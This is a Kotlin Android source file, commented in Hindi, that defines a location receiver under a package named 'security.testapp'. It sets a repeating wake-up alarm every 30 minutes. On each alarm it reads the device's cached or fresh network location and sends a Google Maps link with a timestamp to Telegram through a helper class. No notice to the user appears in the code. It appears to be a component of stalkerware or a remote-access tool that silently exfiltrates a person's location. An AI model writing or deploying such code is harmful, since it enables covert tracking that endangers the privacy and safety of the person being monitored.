package com.security.testapp

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.SystemClock
import androidx.core.app.ActivityCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class LocationReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "com.security.testapp.LOCATION_UPDATE") {
            requestFreshLocation(context)
        }
    }

    private fun requestFreshLocation(context: Context) {
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        // 1. कैश्ड लोकेशन तुरंत भेजें (बैटरी बचाने के लिए नेटवर्क प्रोवाइडर)
        val lastLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            ?: lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if (lastLoc != null) {
            sendLocation(context, lastLoc)
        }

        // 2. ताज़ा लोकेशन लेने की कोशिश (सिर्फ नेटवर्क, GPS नहीं)
        if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    sendLocation(context, location)
                    lm.removeUpdates(this)
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, null)
        }
    }

    private fun sendLocation(context: Context, location: Location) {
        val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.US)
        val now = sdf.format(Date())
        val msg = "<b>📍 Periodic Location</b>\n" +
                "<b>🌐 Link:</b> https://maps.google.com/?q=${location.latitude},${location.longitude}\n" +
                "<b>🕒 Time:</b> $now"
        TelegramHelper.sendWithFallback(msg, context, "HTML")
    }

    companion object {
        private var isStarted = false

        fun startAlarm(context: Context) {
            if (isStarted) return
            isStarted = true
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(context, LocationReceiver::class.java).apply {
                action = "com.security.testapp.LOCATION_UPDATE"
            }
            val pendingIntent = PendingIntent.getBroadcast(
                context, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val interval = 30 * 60 * 1000L // 30 मिनट
            alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + interval,
                interval,
                pendingIntent
            )
        }
    }
}
